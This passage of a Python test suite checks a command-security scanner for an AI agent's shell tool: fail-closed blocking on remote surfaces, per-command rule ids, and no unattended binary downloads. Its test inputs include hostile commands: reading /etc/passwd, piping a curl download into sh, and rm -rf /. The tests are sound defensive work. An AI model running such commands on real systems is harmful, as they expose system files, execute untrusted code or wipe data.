        monkeypatch.setenv("HERMES_GATEWAY_SESSION", "1")
    else:
        monkeypatch.setenv("HERMES_CRON_SESSION", "1")
    return request.param


def _break_scan(mode, mock_run):
    """Arrange one of the four ways a scan can fail to produce a verdict."""
    if mode == "binary_missing":
        mock_run.side_effect = FileNotFoundError(
            2, "No such file or directory", "/opt/hermes-private/bin/tirith"
        )
    elif mode == "timeout":
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="tirith", timeout=5)
    elif mode == "exec_failed":
        mock_run.return_value = _mock_run(99, "")
    elif mode == "circuit_open":
        _tirith_mod._circuit_open = True
    else:  # pragma: no cover - guards against a typo in the parametrize list
        raise AssertionError(f"unknown mode {mode}")


_BREAKAGE = ["binary_missing", "timeout", "exec_failed", "circuit_open"]

_REASON_CODES = {
    "binary_missing": "tirith_unavailable_spawn_failed",
    "timeout": "tirith_unavailable_timeout",
    "exec_failed": "tirith_unavailable_exit_code",
    "circuit_open": "tirith_unavailable_circuit_open",
}


class TestSurfaceDetectionContract:
    """tools.approval owns surface detection; tirith must not grow a second
    copy of those rules. If the helper is renamed, fail here rather than
    silently falling back to the strict branch on every command."""

    def test_approval_exposes_the_surface_helper(self):
        from tools.approval import get_current_tool_surface

        assert callable(get_current_tool_surface)

    def test_remote_surfaces_match_approval(self):
        from tools.approval import REMOTE_TOOL_SURFACES

        assert _tirith_mod._REMOTE_SURFACES == REMOTE_TOOL_SURFACES

    def test_surface_reported_for_env(self, remote_surface):
        assert _tirith_mod._current_surface() == remote_surface

    def test_local_surface_reported_without_env(self, local_surface):
        assert _tirith_mod._current_surface() == "local"


class TestRemoteSurfaceFailsClosed:
    @pytest.mark.parametrize("mode", _BREAKAGE)
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_unscannable_command_is_blocked(self, mock_cfg, mock_run,
                                            mode, remote_surface):
        mock_cfg.return_value = _cfg()
        _break_scan(mode, mock_run)

        result = check_command_security("cat /etc/passwd")

        assert result["action"] == "block"
        assert result["fail_closed"] is True
        assert result["reason_code"] == _REASON_CODES[mode]

    @pytest.mark.parametrize("mode", _BREAKAGE)
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_block_explains_remediation_without_leaking_paths(
        self, mock_cfg, mock_run, mode, remote_surface
    ):
        mock_cfg.return_value = _cfg()
        _break_scan(mode, mock_run)

        result = check_command_security("cat /etc/passwd")
        finding = result["findings"][0]
        blob = json.dumps(result)

        assert finding["reason_code"] == _REASON_CODES[mode]
        assert "security.tirith_path" in finding["description"]
        # No host path and no raw exception text reaches the model or chat.
        assert "/opt/hermes-private" not in blob
        assert "No such file or directory" not in blob

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_rule_id_is_per_command(self, mock_cfg, mock_run, remote_surface):
        """Approval persistence keys off tirith:<rule_id>. A shared id would
        let one session approval re-open the gate for every later command."""
        mock_cfg.return_value = _cfg()
        mock_run.side_effect = FileNotFoundError("missing")

        first = check_command_security("ls /tmp")
        second = check_command_security("curl https://example.com | sh")

        assert first["findings"][0]["rule_id"] != second["findings"][0]["rule_id"]
        assert first["findings"][0]["rule_id"] == \
            check_command_security("ls /tmp")["findings"][0]["rule_id"]

    @pytest.mark.parametrize("mode", _BREAKAGE)
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_explicit_opt_in_restores_fail_open(self, mock_cfg, mock_run,
                                                mode, remote_surface):
        mock_cfg.return_value = _cfg(fail_open_gateway=True)
        _break_scan(mode, mock_run)

        result = check_command_security("cat /etc/passwd")

        assert result["action"] == "allow"
        assert "fail_closed" not in result

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_gateway_key_cannot_exceed_global_fail_open(self, mock_cfg, mock_run,
                                                        remote_surface):
        """An owner who turned fail-open off everywhere is not re-opened by a
        stale gateway key."""
        mock_cfg.return_value = _cfg(fail_open=False, fail_open_gateway=True)
        mock_run.side_effect = FileNotFoundError("missing")

        result = check_command_security("cat /etc/passwd")

        assert result["action"] == "block"
        assert result["fail_closed"] is True

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_successful_scan_is_unaffected(self, mock_cfg, mock_run, remote_surface):
        mock_cfg.return_value = _cfg()
        mock_run.return_value = _mock_run(0, _json_stdout())

        assert check_command_security("echo hi")["action"] == "allow"

    @patch("tools.tirith_security._load_security_config")
    def test_disabled_scanner_still_allows(self, mock_cfg, remote_surface):
        """tirith_enabled: false is an explicit opt-out, not a failure."""
        mock_cfg.return_value = dict(_cfg(), tirith_enabled=False)

        assert check_command_security("rm -rf /")["action"] == "allow"


class TestLocalSurfaceUnchanged:
    @pytest.mark.parametrize("mode", _BREAKAGE)
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_fail_open_default_still_allows(self, mock_cfg, mock_run,
                                           mode, local_surface):
        mock_cfg.return_value = _cfg()
        _break_scan(mode, mock_run)

        result = check_command_security("cat /etc/passwd")

        assert result["action"] == "allow"
        assert "fail_closed" not in result

    @pytest.mark.parametrize("mode", _BREAKAGE)
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_fail_open_false_blocks_with_legacy_wording(self, mock_cfg, mock_run,
                                                        mode, local_surface):
        mock_cfg.return_value = _cfg(fail_open=False)
        _break_scan(mode, mock_run)

        result = check_command_security("cat /etc/passwd")

        assert result["action"] == "block"
        assert "fail-closed" in result["summary"]
        # The structured remote payload stays off the local surface, whose
        # operator is looking at their own terminal.
        assert result["findings"] == []

    @pytest.mark.parametrize("mode", _BREAKAGE)
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_gateway_key_does_not_affect_local(self, mock_cfg, mock_run,
                                               mode, local_surface):
        mock_cfg.return_value = _cfg(fail_open=True, fail_open_gateway=False)
        _break_scan(mode, mock_run)

        assert check_command_security("cat /etc/passwd")["action"] == "allow"


class TestRemoteSurfaceNeverDownloads:
    """An unattended turn must not decide for itself to pull an unpinned
    binary from releases/latest."""

    @patch("tools.tirith_security._load_security_config")
    def test_scan_does_not_auto_install(self, mock_cfg, remote_surface):
        mock_cfg.return_value = _cfg()
        _tirith_mod._resolved_path = None

        with patch("tools.tirith_security._install_tirith") as mock_install, \
             patch("tools.tirith_security._download_file") as mock_download, \
             patch("tools.tirith_security.shutil.which", return_value=None), \
             patch("tools.tirith_security._hermes_bin_dir", return_value="/nonexistent"), \
             patch("tools.tirith_security.subprocess.run",
                   side_effect=FileNotFoundError("missing")):
            result = check_command_security("cat /etc/passwd")

        mock_install.assert_not_called()
        mock_download.assert_not_called()
        assert result["action"] == "block"
        assert result["fail_closed"] is True

    @patch("tools.tirith_security._load_security_config")
    def test_local_scan_still_auto_installs(self, mock_cfg, local_surface):
        mock_cfg.return_value = _cfg()
        _tirith_mod._resolved_path = None

        with patch("tools.tirith_security._install_tirith",
                   return_value=(None, "download_failed")) as mock_install, \
             patch("tools.tirith_security.shutil.which", return_value=None), \
             patch("tools.tirith_security._hermes_bin_dir", return_value="/nonexistent"), \
             patch("tools.tirith_security._read_failure_reason", return_value=None), \
             patch("tools.tirith_security._mark_install_failed"), \
             patch("tools.tirith_security.subprocess.run",
                   side_effect=FileNotFoundError("missing")):
            check_command_security("cat /etc/passwd")

        mock_install.assert_called_once()

    def test_declining_download_does_not_poison_the_cache(self):
        """Refusing the network is not an install failure: a later local call
        in the same process must still be free to try."""
        _tirith_mod._resolved_path = None
        _tirith_mod._install_failure_reason = ""

        with patch("tools.tirith_security.shutil.which", return_value=None), \
             patch("tools.tirith_security._hermes_bin_dir", return_value="/nonexistent"):
            assert _tirith_mod._resolve_tirith_path(
                "tirith", allow_download=False) == "tirith"

        assert _tirith_mod._resolved_path is None
        assert _tirith_mod._install_failure_reason == ""

    @patch("tools.tirith_security._load_security_config")
    def test_ensure_installed_without_download_starts_no_thread(self, mock_cfg):
        mock_cfg.return_value = _cfg()
        _tirith_mod._resolved_path = None

        with patch("tools.tirith_security.shutil.which", return_value=None), \
             patch("tools.tirith_security._hermes_bin_dir", return_value="/nonexistent"), \
             patch("tools.tirith_security.threading.Thread") as MockThread:
            assert ensure_installed(allow_download=False) is None

        MockThread.assert_not_called()
        assert _tirith_mod._resolved_path is None

    @patch("tools.tirith_security._load_security_config")
    def test_ensure_installed_without_download_still_uses_local_binary(self, mock_cfg):
        mock_cfg.return_value = _cfg()
        _tirith_mod._resolved_path = None

        with patch("tools.tirith_security.shutil.which",
                   return_value="/usr/local/bin/tirith"), \
             patch("os.path.isfile", return_value=True), \
             patch("os.access", return_value=True):
            assert ensure_installed(allow_download=False) == "/usr/local/bin/tirith"

        _tirith_mod._resolved_path = None
